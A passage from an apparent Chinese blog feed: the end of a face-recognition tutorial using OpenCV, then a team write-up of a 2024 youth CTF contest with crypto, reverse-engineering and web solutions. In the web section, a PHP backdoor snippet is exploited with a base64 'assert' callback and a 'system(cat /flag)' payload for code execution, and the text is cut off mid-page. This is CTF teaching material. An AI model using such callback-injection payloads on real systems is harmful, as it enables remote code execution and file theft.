class="line"><span class="string">    # 转换图像格式</span></span><br><span class="line"><span class="string">    rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 检测人脸</span></span><br><span class="line"><span class="string">    face_locations = face_recognition.face_locations(rgb_frame)</span></span><br><span class="line"><span class="string">    face_encodings = face_recognition.face_encodings(rgb_frame, face_locations)</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># 获取人脸位置和编码</span></span><br><span class="line">    face_locations, face_encodings = face_detector.get_faces()</span><br></pre></td></tr></table></figure><p>这样修改后帧率大大提高，但是出现了框选人脸位置错误的问题，如下图：</p><p><img src="/assets/post_img/AI/%E5%9F%BA%E4%BA%8EOpenCV&amp;face-recognition%E7%9A%84%E5%AE%9E%E6%97%B6%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB%E4%B8%8E%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/update1.png" alt="image-20241210221815041"></p><p>人脸位置和框选位置刚好对称</p><p>原因是main.py中通过 <code>frame = cv2.flip(frame, 1)</code> 进行了镜像处理，<a href="http://FaceDetect.py">FaceDetect.py</a> 中调用 <a href="http://camera.py">camera.py</a> 后没有镜像处理，返回的人脸位置是没有经过处理的人脸位置，所以可以在 <a href="http://FaceDetect.py">FaceDetect.py</a> 中添加 <code>frame = cv2.flip(frame, 1)</code> ，或者删除 <a href="http://main.py">main.py</a> 中的镜像处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#添加镜像处理后的FaceDetect.py</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> face_recognition</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FaceDetector</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, camera_thread, detection_interval</span>):</span><br><span class="line">        <span class="variable language_">self</span>.camera_thread = camera_thread</span><br><span class="line">        <span class="variable language_">self</span>.detection_interval = detection_interval</span><br><span class="line">        <span class="variable language_">self</span>.frame_count = <span class="number">0</span></span><br><span class="line">        <span class="variable language_">self</span>.face_locations = []</span><br><span class="line">        <span class="variable language_">self</span>.face_encodings = []</span><br><span class="line">        <span class="variable language_">self</span>.kill_event = threading.Event()</span><br><span class="line">        <span class="variable language_">self</span>.lock = threading.Lock()  </span><br><span class="line">        <span class="variable language_">self</span>.detection_thread = threading.Thread(target=<span class="variable language_">self</span>.detect_faces)</span><br><span class="line">        <span class="variable language_">self</span>.detection_thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">detect_faces</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> <span class="variable language_">self</span>.kill_event.is_set():</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.frame_count % <span class="variable language_">self</span>.detection_interval == <span class="number">0</span>:</span><br><span class="line">                frame = <span class="variable language_">self</span>.camera_thread.read()</span><br><span class="line">                frame = cv2.flip(frame, <span class="number">1</span>) <span class="comment"># 镜像处理</span></span><br><span class="line">                rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)</span><br><span class="line">                face_locations = face_recognition.face_locations(rgb_frame)</span><br><span class="line">                face_encodings = face_recognition.face_encodings(rgb_frame, <span class="variable language_">self</span>.face_locations)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">with</span> <span class="variable language_">self</span>.lock:  </span><br><span class="line">                    <span class="variable language_">self</span>.face_locations = face_locations</span><br><span class="line">                    <span class="variable language_">self</span>.face_encodings = face_encodings</span><br><span class="line">            <span class="variable language_">self</span>.frame_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stop</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.kill_event.<span class="built_in">set</span>()</span><br><span class="line">        <span class="variable language_">self</span>.detection_thread.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_faces</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="variable language_">self</span>.lock:  </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.face_locations, <span class="variable language_">self</span>.face_encodings</span><br></pre></td></tr></table></figure><p>改进效果比对如下</p><ul class="lvl-0"><li class="lvl-2"><p>改进前无人脸</p></li></ul><p><img src="/assets/post_img/AI/%E5%9F%BA%E4%BA%8EOpenCV&amp;face-recognition%E7%9A%84%E5%AE%9E%E6%97%B6%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB%E4%B8%8E%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/before_update1.png" alt="image-20241210223920330"></p><ul class="lvl-0"><li class="lvl-2"><p>改进前有人脸</p></li></ul><p><img src="/assets/post_img/AI/%E5%9F%BA%E4%BA%8EOpenCV&amp;face-recognition%E7%9A%84%E5%AE%9E%E6%97%B6%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB%E4%B8%8E%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/before_update2.png" alt="image-20241210223943508"></p><ul class="lvl-0"><li class="lvl-2"><p>改进后无人脸</p></li></ul><p><img src="/assets/post_img/AI/%E5%9F%BA%E4%BA%8EOpenCV&amp;face-recognition%E7%9A%84%E5%AE%9E%E6%97%B6%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB%E4%B8%8E%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/after_update1.png" alt="image-20241210224041308"></p><ul class="lvl-0"><li class="lvl-2"><p>改进后有人脸</p></li></ul><p><img src="/assets/post_img/AI/%E5%9F%BA%E4%BA%8EOpenCV&amp;face-recognition%E7%9A%84%E5%AE%9E%E6%97%B6%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB%E4%B8%8E%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/after_update2.png" alt="image-20241210224106642"></p><p>可见通过添加新的线程和增加间隔的改进效果非常显著。</p><h3 id="参考资料：">参考资料：</h3><p>[1] <strong>OpenCV Tutorials</strong>: <a href="https://docs.opencv.org/4.x/d9/df8/tutorial_root.html">https://docs.opencv.org/4.x/d9/df8/tutorial_root.html</a></p><p>[2] <strong>face-recognition</strong>: <a href="https://github.com/ageitgey/face_recognition">https://github.com/ageitgey/face_recognition</a></p><p>[3] <strong>基于cv2.VideoCapture 和 OpenCV 得到更快的 FPS之文件篇</strong>: <a href="https://blog.csdn.net/weixin_43229348/article/details/122688684">https://blog.csdn.net/weixin_43229348/article/details/122688684</a></p><p>[4] <strong>OpenCV 中文文档</strong>: <a href="https://apachecn.github.io/opencv-doc-zh/#/">https://apachecn.github.io/opencv-doc-zh/#/</a></p><p>[5] <strong>Flask框架入门教程</strong>: <a href="https://blog.csdn.net/wly55690/article/details/131683846">https://blog.csdn.net/wly55690/article/details/131683846</a></p>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024强网杯青少年专项赛初赛团队wp</title>
      <link href="/posts/be30837a.html"/>
      <url>/posts/be30837a.html</url>
      
        <content type="html"><![CDATA[<h1>2024强网杯青少年专项赛初赛团队wp</h1><p>战绩：rk11<br>有幸参加线下赛，但是题目忘了，附件也没有留（</p><h1><strong>Misc</strong></h1><h2 id="1-签到漫画">1.签到漫画</h2><p>看4幅漫画，得到4个1/4二维码，拼接扫描即可。</p><h2 id="2-whitepic">2.whitepic</h2><p>查看文件格式为gif</p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/whitepic1.png" alt="image-20241124122902265"></p><p>拆帧</p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/whitepic2.png" alt="image-20241124122922796"></p><p>flag{passion_is_the_greatest_teacher}</p><h1><strong>Crypto</strong></h1><h2 id="1-Classics">1.Classics</h2><p>CyberChef逆向，根据加密来解密</p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/classics.png" alt="image.png"></p><h2 id="2-AliceAES">2.AliceAES</h2><p>根据题目要求用key和vi的AES加密<em><strong>Hello, Bob!</strong></em></p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/aes1.png" alt="image.png"></p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/aes2.png" alt="image.png"></p><h2 id="3-easymath">3.easymath</h2><p>根据加密写出解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime, invert</span><br><span class="line"></span><br><span class="line">n = <span class="number">739243847275389709472067387827484120222494013590074140985399787562594529286597003777105115865446795908819036678700460141950875653695331369163361757157565377531721748744087900881582744902312177979298217791686598853486325684322963787498115587802274229739619528838187967527241366076438154697056550549800691528794136318856475884632511630403822825738299776018390079577728412776535367041632122565639036104271672497418509514781304810585503673226324238396489752427801699815592314894581630994590796084123504542794857800330419850716997654738103615725794629029775421170515512063019994761051891597378859698320651083189969905297963140966329378723373071590797203169830069428503544761584694131795243115146000564792100471259594488081571644541077283644666700962953460073953965250264401973080467760912924607461783312953419038084626809675807995463244073984979942740289741147504741715039830341488696960977502423702097709564068478477284161645957293908613935974036643029971491102157321238525596348807395784120585247899369773609341654908807803007460425271832839341595078200327677265778582728994058920387721181708105894076110057858324994417035004076234418186156340413169154344814582980205732305163274822509982340820301144418789572738830713925750250925049059</span></span><br><span class="line">c = <span class="number">229043746793674889024653533006701296308351926745769842802636384094759379740300534278302123222014817911580006421847607123049816103885365851535481716236688330600113899345346872012870482410945158758991441294885546642304012025685141746649427132063040233448959783730507539964445711789203948478927754968414484217451929590364252823034436736148936707526491427134910817676292865910899256335978084133885301776638189969716684447886272526371596438362601308765248327164568010211340540749408337495125393161427493827866434814073414211359223724290251545324578501542643767456072748245099538268121741616645942503700796441269556575769250208333551820150640236503765376932896479238435739865805059908532831741588166990610406781319538995712584992928490839557809170189205452152534029118700150959965267557712569942462430810977059565077290952031751528357957124339169562549386600024298334407498257172578971559253328179357443841427429904013090062097483222125930742322794450873759719977981171221926439985786944884991660612824458339473263174969955453188212116242701330480313264281033623774772556593174438510101491596667187356827935296256470338269472769781778576964130967761897357847487612475534606977433259616857569013270917400687539344772924214733633652812119743</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">l = <span class="number">2331</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">count_sequences</span>(<span class="params">n</span>):</span><br><span class="line">    dp = [&#123;&#125; <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n+<span class="number">1</span>)]</span><br><span class="line">    dp[<span class="number">1</span>][(<span class="number">1</span>,<span class="number">1</span>)] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, n):</span><br><span class="line">        dp_next = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> state, count <span class="keyword">in</span> dp[pos].items():</span><br><span class="line">            last_bit, consec_count = state</span><br><span class="line">            <span class="comment"># 添加0</span></span><br><span class="line">            <span class="keyword">if</span> last_bit == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> consec_count &lt; <span class="number">3</span>:</span><br><span class="line">                    new_state = (<span class="number">0</span>, consec_count + <span class="number">1</span>)</span><br><span class="line">                    dp_next[new_state] = dp_next.get(new_state, <span class="number">0</span>) + count</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                new_state = (<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">                dp_next[new_state] = dp_next.get(new_state, <span class="number">0</span>) + count</span><br><span class="line">            <span class="comment"># 添加1</span></span><br><span class="line">            <span class="keyword">if</span> last_bit == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> consec_count &lt; <span class="number">3</span>:</span><br><span class="line">                    new_state = (<span class="number">1</span>, consec_count + <span class="number">1</span>)</span><br><span class="line">                    dp_next[new_state] = dp_next.get(new_state, <span class="number">0</span>) + count</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                new_state = (<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">                dp_next[new_state] = dp_next.get(new_state, <span class="number">0</span>) + count</span><br><span class="line">        dp[pos + <span class="number">1</span>] = dp_next</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 累加所有合法状态的计数</span></span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> state, count <span class="keyword">in</span> dp[n].items():</span><br><span class="line">        last_bit, consec_count = state</span><br><span class="line">        <span class="keyword">if</span> last_bit == <span class="number">1</span> <span class="keyword">and</span> consec_count &lt;= <span class="number">3</span>:</span><br><span class="line">            key += count</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">key = count_sequences(l)</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">int</span>(next_prime(key))</span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag{77310934-21fa-4ee4-a783-dc1865ebab28}</p><h1><strong>Reverse</strong></h1><h2 id="1-EnterGame">1.EnterGame</h2><p>分析main函数，找到加密函数和加密后的flag→s2</p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/entergame1.png" alt="image.png"></p><p>分析加密函数</p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/entergame2.png" alt="image.png"></p><p>a3为用户输入的flag，a4是加密flag→s2</p><p>动调可以提取v16的值，并写异或解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned char v16[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x38</span>, <span class="number">0x7F</span>, <span class="number">0xCB</span>, <span class="number">0xB4</span>, <span class="number">0xFC</span>, <span class="number">0x46</span>, <span class="number">0x13</span>, <span class="number">0x4F</span>, <span class="number">0x22</span>, <span class="number">0x27</span>, </span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0xC2</span>, <span class="number">0x2D</span>, <span class="number">0x53</span>, <span class="number">0x25</span>, <span class="number">0xB4</span>, <span class="number">0x58</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x74</span>, </span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x20</span>, <span class="number">0x53</span>, <span class="number">0x74</span>, <span class="number">0x71</span>, <span class="number">0x65</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, </span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x6E</span>, <span class="number">0x9A</span>, <span class="number">0xE4</span>, <span class="number">0x9E</span>, <span class="number">0xB8</span>, <span class="number">0x86</span>, <span class="number">0xCF</span>, <span class="number">0x69</span>, <span class="number">0x3F</span>, </span><br><span class="line">  <span class="number">0xAA</span>, <span class="number">0xBC</span>, <span class="number">0x94</span>, <span class="number">0x90</span>, <span class="number">0x84</span>, <span class="number">0xDD</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x2F</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, </span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x60</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">unsigned char enflag[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x5E</span>, <span class="number">0x13</span>, <span class="number">0xAA</span>, <span class="number">0xD3</span>, <span class="number">0x87</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x7A</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, </span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0xA3</span>, <span class="number">0x49</span>, <span class="number">0x7E</span>, <span class="number">0x1D</span>, <span class="number">0xD2</span>, <span class="number">0x6B</span>, <span class="number">0x5D</span>, <span class="number">0x58</span>, <span class="number">0x40</span>, </span><br><span class="line">  <span class="number">0x5E</span>, <span class="number">0x44</span>, <span class="number">0x63</span>, <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0x51</span>, <span class="number">0x0D</span>, <span class="number">0x54</span>, <span class="number">0x5E</span>, <span class="number">0x58</span>, </span><br><span class="line">  <span class="number">0x55</span>, <span class="number">0x58</span>, <span class="number">0xAD</span>, <span class="number">0x82</span>, <span class="number">0xAF</span>, <span class="number">0xDC</span>, <span class="number">0xE7</span>, <span class="number">0xAB</span>, <span class="number">0x58</span>, <span class="number">0x5D</span>, </span><br><span class="line">  <span class="number">0xCE</span>, <span class="number">0xC1</span>, <span class="number">0x32</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">100</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> v16[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x38</span>, <span class="number">0x7F</span>, <span class="number">0xCB</span>, <span class="number">0xB4</span>, <span class="number">0xFC</span>, <span class="number">0x46</span>, <span class="number">0x13</span>, <span class="number">0x4F</span>, <span class="number">0x22</span>, <span class="number">0x27</span>,</span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0xC2</span>, <span class="number">0x2D</span>, <span class="number">0x53</span>, <span class="number">0x25</span>, <span class="number">0xB4</span>, <span class="number">0x58</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x74</span>,</span><br><span class="line">  <span class="number">0x67</span>, <span class="number">0x20</span>, <span class="number">0x53</span>, <span class="number">0x74</span>, <span class="number">0x71</span>, <span class="number">0x65</span>, <span class="number">0x6E</span>, <span class="number">0x67</span>, <span class="number">0x73</span>, <span class="number">0x68</span>,</span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x6E</span>, <span class="number">0x9A</span>, <span class="number">0xE4</span>, <span class="number">0x9E</span>, <span class="number">0xB8</span>, <span class="number">0x86</span>, <span class="number">0xCF</span>, <span class="number">0x69</span>, <span class="number">0x3F</span>,</span><br><span class="line">  <span class="number">0xAA</span>, <span class="number">0xBC</span>, <span class="number">0x94</span>, <span class="number">0x90</span>, <span class="number">0x84</span>, <span class="number">0xDD</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x2F</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>,</span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x60</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> enflag[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x5E</span>, <span class="number">0x13</span>, <span class="number">0xAA</span>, <span class="number">0xD3</span>, <span class="number">0x87</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x7A</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>,</span><br><span class="line">  <span class="number">0x04</span>, <span class="number">0xA3</span>, <span class="number">0x49</span>, <span class="number">0x7E</span>, <span class="number">0x1D</span>, <span class="number">0xD2</span>, <span class="number">0x6B</span>, <span class="number">0x5D</span>, <span class="number">0x58</span>, <span class="number">0x40</span>,</span><br><span class="line">  <span class="number">0x5E</span>, <span class="number">0x44</span>, <span class="number">0x63</span>, <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0x51</span>, <span class="number">0x0D</span>, <span class="number">0x54</span>, <span class="number">0x5E</span>, <span class="number">0x58</span>,</span><br><span class="line">  <span class="number">0x55</span>, <span class="number">0x58</span>, <span class="number">0xAD</span>, <span class="number">0x82</span>, <span class="number">0xAF</span>, <span class="number">0xDC</span>, <span class="number">0xE7</span>, <span class="number">0xAB</span>, <span class="number">0x58</span>, <span class="number">0x5D</span>,</span><br><span class="line">  <span class="number">0xCE</span>, <span class="number">0xC1</span>, <span class="number">0x32</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i += <span class="number">64</span> )</span><br><span class="line">  &#123;</span><br><span class="line">       <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">63</span> &amp;&amp; <span class="number">42</span> &gt; i + j; ++j )</span><br><span class="line">      *(<span class="type">char</span> *)(i + j + flag) = v16[j] ^ *(<span class="type">char</span> *)(i + j + enflag);</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag{385915ad-8f32-49d0-94c3-0067f1dad1bd}</p><h2 id="2-Flip-over">2.Flip_over</h2><p>jadx发现加载了lib，并且对用户输入进行check</p><p><img src="D:%5C%E4%B8%8B%E8%BD%BD%5Cre%5Cflip1.png" alt="image.png"></p><p>来到so文件</p><p><img src="D:%5C%E4%B8%8B%E8%BD%BD%5Cre%5Cflip2.png" alt="image.png"></p><p>发现加密函数</p><p>rc4</p><p>des加密</p><p>最后异或加密</p><p>提取数据</p><p><img src="D:%5C%E4%B8%8B%E8%BD%BD%5Cre%5Cflip3.png" alt="image.png"></p><p>丢进赛博厨子</p><p><img src="D:%5C%E4%B8%8B%E8%BD%BD%5Cre%5Cflip4.png" alt="image.png"></p><p>出flag</p><h1><strong>Web</strong></h1><h2 id="1-ezGetFlag">1.ezGetFlag</h2><p>网页源码中发现一个backend.php,</p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/ezgetflag1.png" alt="image.png"></p><p>点击网页按钮提示</p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/ezgetflag2.png" alt="image.png"></p><p>所以使用post方法访问backend.php</p><p>即可得到flag</p><h2 id="2-ezFindShell">2.ezFindShell</h2><p>在1de9d9a55a824f4f8b6f37af76596baa.php发现post</p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/ezfindshell1.png" alt="image-20241124192413375"></p><p>存在漏洞代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$e</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];<span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;POST&#x27;</span>],);<span class="title function_ invoke__">array_filter</span>(<span class="variable">$arr</span>,<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$e</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>base64_decode($e)的结果作为回调函数，可能导致任意代码执行</p><p>构造post：POST=system(“cat /flag”)&amp;e=YXNzZXJ0</p><p><img src="/assets/post_img/ctf/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B%E5%88%9D%E8%B5%9B/ezfindshell2.png" alt="image-20241124193833136"></p><h2 id="3-cyberboard">3.cyberboard</h2><p>src中均为js文件，联想到原型链污染</p><p>在src中发现admin，登录</p><p><img 